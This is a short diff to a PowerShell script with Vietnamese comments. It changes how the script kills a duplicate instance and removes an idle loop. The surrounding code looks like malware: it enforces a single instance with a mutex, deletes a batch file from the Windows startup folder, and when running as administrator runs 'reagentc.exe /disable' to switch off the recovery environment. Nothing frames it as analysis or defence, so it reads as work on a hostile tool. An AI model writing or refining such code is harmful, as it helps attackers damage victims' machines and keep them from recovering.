@@ -62,7 +62,7 @@ try {
     # Kiểm tra xem Mutex đã tồn tại chưa
     $mutex = [System.Threading.Mutex]::OpenExisting($mutexName)
     Write-Host "[!] An instance of this script is already running."
-    exit
+    Stop-Process -Id $PID -Force
 } catch {
     # Nếu Mutex chưa tồn tại, tạo mới
     $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$CreatedNew)
@@ -71,7 +71,7 @@ try {
 # Nếu không tạo được Mutex mới, thoát script
 if (-not $CreatedNew) {
     Write-Host "[!] Another instance is already running."
-    exit
+    Stop-Process -Id $PID -Force
 }
 
 Remove-Item -Path "$startupfolder\download.bat" -Force
@@ -178,8 +178,4 @@ if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]:
     reagentc.exe /disable
 } else {
     echo "Not running as Admin"
-}
-
-while ($true) {
-    Start-Sleep -Seconds 50
 }
